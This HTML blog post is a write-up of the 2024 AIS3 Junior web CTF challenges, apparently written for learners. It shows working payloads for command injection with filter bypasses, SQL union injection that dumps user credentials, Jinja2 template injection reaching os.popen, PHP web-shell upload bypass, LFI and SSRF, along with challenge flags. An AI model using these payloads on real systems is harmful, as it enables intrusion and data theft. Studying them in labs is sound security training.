@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="AIS3 Junior Web Writeup BAC01 Just fill in 1 in the input box and see\nI noticed it was &ldquo;user&rdquo; above.\nChange it to &ldquo;admin&rdquo; and try again.\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+
+<title>Agong&#39;s Blog</title><title>2024 AIS3 Junior Web&#39;s Writeup</title>
+
+<link rel='canonical' href='https://agong88.github.io/en/post/2024-ais3-junior-webs-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2024 AIS3 Junior Web's Writeup">
+<meta property='og:description' content="AIS3 Junior Web Writeup BAC01 Just fill in 1 in the input box and see\nI noticed it was &ldquo;user&rdquo; above.\nChange it to &ldquo;admin&rdquo; and try again.\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+<meta property='og:url' content='https://agong88.github.io/en/post/2024-ais3-junior-webs-writeup/'>
+<meta property='og:site_name' content='Agong&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='2024' /><meta property='article:published_time' content='2024-08-18T00:00:00&#43;08:00'/><meta property='article:modified_time' content='2024-08-18T00:00:00&#43;08:00'/>
+<meta name="twitter:title" content="2024 AIS3 Junior Web's Writeup">
+<meta name="twitter:description" content="AIS3 Junior Web Writeup BAC01 Just fill in 1 in the input box and see\nI noticed it was &ldquo;user&rdquo; above.\nChange it to &ldquo;admin&rdquo; and try again.\nFLAG：AIS3_Junior{FirstBROKENAccessControl;)}\n">
+    <link rel="shortcut icon" href="/img/new-avatar.PNG" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/new-avatar_hu_a21375ee9691e2f1.PNG" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧑‍🦳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">Agong&#39;s Blog</a></h1>
+            <h2 class="site-description">Hi, I&#39;m Chun-Hao Chung Welcome to my Blog</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/page/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/page/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/page/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/page/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://agong88.github.io/en/" selected>English</option>
+                                
+                                    <option value="https://agong88.github.io/" >中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#bac01">BAC01</a></li>
+    <li><a href="#bac02">BAC02</a></li>
+    <li><a href="#bac03">BAC03</a></li>
+    <li><a href="#fil01">FIL01</a></li>
+    <li><a href="#fil02">FIL02</a></li>
+    <li><a href="#lfi01">LFI01</a></li>
+    <li><a href="#lfi02">LFI02</a></li>
+    <li><a href="#xss01">XSS01</a></li>
+    <li><a href="#cmd01">CMD01</a></li>
+    <li><a href="#cmd02">CMD02</a></li>
+    <li><a href="#cmd03">CMD03</a></li>
+    <li><a href="#cmd04">CMD04</a></li>
+    <li><a href="#cmd06">CMD06</a></li>
+    <li><a href="#sql01">SQL01</a></li>
+    <li><a href="#sql02">SQL02</a></li>
+    <li><a href="#sti01">STI01</a></li>
+    <li><a href="#sti02">STI02</a></li>
+    <li><a href="#srf01">SRF01</a></li>
+    <li><a href="#srf02">SRF02</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/security/" >
+                Security
+            </a>
+        
+            <a href="/en/categories/ais3/" >
+                AIS3
+            </a>
+        
+            <a href="/en/categories/writeup/" >
+                Writeup
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/en/post/2024-ais3-junior-webs-writeup/">2024 AIS3 Junior Web&#39;s Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 18, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="https://agong88.github.io/post/2024-ais3-junior-web%E3%84%89writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="ais3-junior-web-writeup">AIS3 Junior Web Writeup
+</h1><h2 id="bac01">BAC01
+</h2><p>Just fill in 1 in the input box and see</p>
+<p><img src="https://hackmd.io/_uploads/BknBuHncA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>I noticed it was &ldquo;user&rdquo; above.<br>
+Change it to &ldquo;admin&rdquo; and try again.</p>
+<p><img src="https://hackmd.io/_uploads/B1-1YB25A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{FirstBROKENAccessControl;)}</code></p></blockquote>
+<h2 id="bac02">BAC02
+</h2><p><img src="https://hackmd.io/_uploads/H1btFH29R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>First check the link above</p>
+<p><img src="https://hackmd.io/_uploads/Bk8sYBh50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Come here and take a look</p>
+<p><img src="https://hackmd.io/_uploads/B1npFH2qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/HJ_xqSh5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>I found a 3 and a 5, so where is the 4?</p>
+<p><img src="https://hackmd.io/_uploads/HJ_7cB25R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>4 is the answer</p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BroJustFoundBabyIDORVulnerability}</code></p></blockquote>
+<h2 id="bac03">BAC03
+</h2><p><img src="https://hackmd.io/_uploads/By25nXRqC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>First throw a 1 and see</p>
+<p><img src="https://hackmd.io/_uploads/SJy6hm09C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Note that the URL above is &ldquo;user&rdquo;.<br>
+Where there is a user, there is also an admin.<br>
+Change it to admin and see what happens.</p>
+<p><img src="https://hackmd.io/_uploads/BJqHTQC5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>I&rsquo;m surprised it&rsquo;s an error.<br>
+Let&rsquo;s try using curl.</p>
+<p><img src="https://hackmd.io/_uploads/rJoyRXAq0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/SyigRQC5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyBRokenAccEssControoooooool}</code></p></blockquote>
+<h2 id="fil01">FIL01
+</h2><p>Open the website and there is only this most likely place to have a vulnerability</p>
+<p><img src="https://hackmd.io/_uploads/H11SFI3cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Write a php that can touch the host and upload it</p>
+<p><img src="https://hackmd.io/_uploads/r1HcYLncR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/H1_0Y82cR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Upload completed</p>
+<p><img src="https://hackmd.io/_uploads/HyUw58nc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Change the URL to the location he gave you.<br>
+You can connect to it.<br>
+Try ls</p>
+<p><img src="https://hackmd.io/_uploads/Bk-V2UnqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then cat ../FLAG and see</p>
+<p><img src="https://hackmd.io/_uploads/r1lEKhUn9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{FirstWEBSHELLXDDD}</code></p></blockquote>
+<h2 id="fil02">FIL02
+</h2><p>This question uses Kali and then opens Burp Suite</p>
+<p><img src="https://hackmd.io/_uploads/ry_58329R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Upload the same PHP file as in the previous question, but block the packet.</p>
+<p><img src="https://hackmd.io/_uploads/SJoJ_hncR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Click the second Send to Repeater and then click Repeater on the top row</p>
+<p><img src="https://hackmd.io/_uploads/Hyeduh3qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Because <code>Content-Type: application/x-php</code> blocks PHP, change it to <code>Content-Type: /jpg</code> and send it.</p>
+<p><img src="https://hackmd.io/_uploads/HyYCyAn9C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>There is a URL, so try it after the URL</p>
+<p><img src="https://hackmd.io/_uploads/BkrflC2cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>If there is a connection, try adding ?cmd=ls</p>
+<p><img src="https://hackmd.io/_uploads/ryUuWCh50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>If you have something, start looking for FLAG</p>
+<p><img src="https://hackmd.io/_uploads/rJMWMCnqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyUploadBypass}</code></p></blockquote>
+<h2 id="lfi01">LFI01
+</h2><p><img src="https://hackmd.io/_uploads/BkApRn2qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>For this question, use the method taught in the presentation.<br>
+Change the URL <code>http://ctfd-ais3.crazyfirelee.tw:9021/</code> to<br>
+<code>http://ctfd-ais3.crazyfirelee.tw:9021/include.php?GetType=file_get_contents&amp;file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="https://hackmd.io/_uploads/rkgu1ahqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Hey, this thing looks so ugly! There&rsquo;s also something at the end ==<br>
+Base64 decode it and see.</p>
+<p><img src="https://hackmd.io/_uploads/ryDkxan9A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Username：admin<br>
+Password：CATLOVEBITCOINMEOWMEOW<br>
+Send back to login</p>
+<p><img src="https://hackmd.io/_uploads/S1rSganqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}</code></p></blockquote>
+<h2 id="lfi02">LFI02
+</h2><p>Find the only place that can interact with the backend</p>
+<p><img src="https://hackmd.io/_uploads/BkBhjThcA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Upload FIL01 and FIL02&rsquo;s php in the same way</p>
+<p><img src="https://hackmd.io/_uploads/B1G4np35C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Isn&rsquo;t this a URL? The previous Update page has <code>form=form.html</code><br>
+Please try filling it in.<br>
+So it would be<br>
+<code>http://ctfd-ais3.crazyfirelee.tw:9022/post.php?form=/tmp/c3644_108.160.138.201.php</code></p>
+<p><img src="https://hackmd.io/_uploads/HkoLpTn9A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then add &amp;cmd=ls and see</p>
+<p><img src="https://hackmd.io/_uploads/HyhWCT29C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Found the FLAG CAT it</p>
+<p><img src="https://hackmd.io/_uploads/HJFHC63qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}</code></p></blockquote>
+<h2 id="xss01">XSS01
+</h2><p><img src="https://hackmd.io/_uploads/rJT4IL25C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>It&rsquo;s XSS. Let&rsquo;s try <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><img src="https://hackmd.io/_uploads/Skp_PU390.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>If you have confirmed that there is an XSS vulnerability, use alert(FLAG) to check.</p>
+<p><img src="https://hackmd.io/_uploads/BJKluI3qR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{XSSXSSXSSXSS}</code></p></blockquote>
+<h2 id="cmd01">CMD01
+</h2><p>Let’s ping first.</p>
+<p><img src="https://hackmd.io/_uploads/r1UAhPnc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Hey, isn&rsquo;t this a terminal?<br>
+Then run ls and see.</p>
+<p><img src="https://hackmd.io/_uploads/H1od6v35C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then the cat flag comes out.</p>
+<p><img src="https://hackmd.io/_uploads/SyNn6v390.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BabyCommand;InjectionXDDDddddd}</code></p></blockquote>
+<h2 id="cmd02">CMD02
+</h2><p>This question has a blacklist, so you have to bypass it<br>
+Change the command to<code>ping ; c$()at FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/ByVNG_h9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>The answer is out</p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{niceWordBL$()ACKListEvasion;)}</code></p></blockquote>
+<h2 id="cmd03">CMD03
+</h2><p>Testing this question revealed that &amp; would be blocked.<br>
+So I changed it to <code>127.0.0.1|l''s</code></p>
+<p><img src="https://hackmd.io/_uploads/Skrzb4C5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><code>127.0.0.1|c''at${IFS}FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/B1VwbV0qC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{BashOperato|rEvasion${IFS}SUCC|ESSFUL|:DDDDD}</code></p></blockquote>
+<h2 id="cmd04">CMD04
+</h2><p><img src="https://hackmd.io/_uploads/HJMOXVRcA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>As long as it&rsquo;s a command, everything is good.<br>
+So, try running ls with <code>l''s</code>.</p>
+<p><img src="https://hackmd.io/_uploads/BJwYEV090.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Still wrong, after trying several times I found that <code>&quot;`l''s`&quot;</code></p>
+<p><img src="https://hackmd.io/_uploads/HyK0EECc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>就<code>&quot;`c''at${IFS}ERRORCMDi_FLAG`&quot;</code></p>
+<p><img src="https://hackmd.io/_uploads/B1lbSVR90.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{E${IFS}RRORB3sed|$(CMDi)Succ3ss:DD}</code></p></blockquote>
+<h2 id="cmd06">CMD06
+</h2><p>The test showed this: it would be blocked.<br>
+So I changed it to <code>127.0.0.1&amp;&amp;l''s</code></p>
+<p><img src="https://hackmd.io/_uploads/HJZ4zECcR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then <code>127.0.0.1&amp;&amp;c''at${IFS}FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/BkZemECcC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{ouo_hihi}</code></p></blockquote>
+<h2 id="sql01">SQL01
+</h2><p>For this question, use the SQL syntax &ldquo;admin&rsquo; or 1=1&rdquo; and comment out the &ldquo;-&rdquo; at the end. Since the password is commented out, you can just fill it in with whatever you want.</p>
+<p><img src="https://hackmd.io/_uploads/HJ70BT2q0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/SJyHITh9R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{SQL'InjectionXDorD=D_--_-}</code></p></blockquote>
+<h2 id="sql02">SQL02
+</h2><p>First use a to see how many databases there are</p>
+<p><img src="https://hackmd.io/_uploads/HyVrys6qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then use <code>' order by 1-- // </code>query column level</p>
+<p><img src="https://hackmd.io/_uploads/HJ_Rb3acA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Until the fifth floor</p>
+<p><img src="https://hackmd.io/_uploads/rkQxzhp5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then use <code>' UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata#</code> to check the location of detabase</p>
+<p><img src="https://hackmd.io/_uploads/Bksqf3T5A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>I saw ApexPredators.<br>
+Use ```` UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&lsquo;ApexPredators&rsquo; to find ApexPredators.</p>
+<p><img src="https://hackmd.io/_uploads/HJqcQnTq0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>I see the user.<br>
+Use ```` union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&lsquo;ApexPredators&rsquo; and table_name=&lsquo;users&rsquo; #``` to find users.</p>
+<p><img src="https://hackmd.io/_uploads/rJ9842a50.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then use <code>' union select 1,username,password,isAdmin from ApexPredators.users#</code> to check the account content</p>
+<p><img src="https://hackmd.io/_uploads/HJe8B3Tc0.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Found an admin account with 1 user.<br>
+Username：KubenBlisk<br>
+Password：BliskLeader#2024</p>
+<p><img src="https://hackmd.io/_uploads/SyQaHh65R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{_BRO-DO_A--UNION_SELECTXDDD_--_-}</code></p></blockquote>
+<h2 id="sti01">STI01
+</h2><p>Try what the instructor said first.<code>{{ self.__init__.__globals__.__builtins__ }}</code></p>
+<p><img src="https://hackmd.io/_uploads/ryL4_a29A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>It looks like there&rsquo;s a Template vulnerability.<br>
+Let&rsquo;s try it.<br>
+<code>{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}</code></p>
+<p><img src="https://hackmd.io/_uploads/BkWWtT2qA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>After successfully entering, change the id to ls to see what happens</p>
+<p><img src="https://hackmd.io/_uploads/BkcUFp3cC.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Then change ls to cat FLAG and send it out</p>
+<p><img src="https://hackmd.io/_uploads/ByLctpn5R.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{.__JinjaTWOOOO.___[&quot;SSTI&quot;]__.succ3ssXDD.__}</code></p></blockquote>
+<h2 id="sti02">STI02
+</h2><p>For some reason, this question is the same as the previous one, except for the flag.<br>
+So the steps are the same as the previous one.</p>
+<p><img src="https://hackmd.io/_uploads/SyFU9635A.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{b4by__.filt3rEvasion.__Succ3ss}</code></p></blockquote>
+<h2 id="srf01">SRF01
+</h2><p>According to the question, the file is located under /app/FLAG. So, type <code>file://127.0.0.1/app/FLAG</code></p>
+<p><img src="https://hackmd.io/_uploads/SJXzVJpqA.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>After entering, find the source code</p>
+<p><img src="https://hackmd.io/_uploads/HJY_Eka5C.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://hackmd.io/_uploads/BkL9VJpcR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>Found something that can Base64 decode<br>
+<code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br>
+After decoding</p>
+<p><img src="https://hackmd.io/_uploads/SybyHypqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{file://SSRF___XDDD}</code></p></blockquote>
+<h2 id="srf02">SRF02
+</h2><p>This question was mentioned in class. FLAG is in local, so you can type the following:<br>
+<code>http://127.0.0.1/local</code><br>
+The rest of the process is the same as the previous question</p>
+<p><img src="https://hackmd.io/_uploads/SkmBuJpqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{http://BROAccessLOCAL}</code></p></blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/en/tags/2024/">2024</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
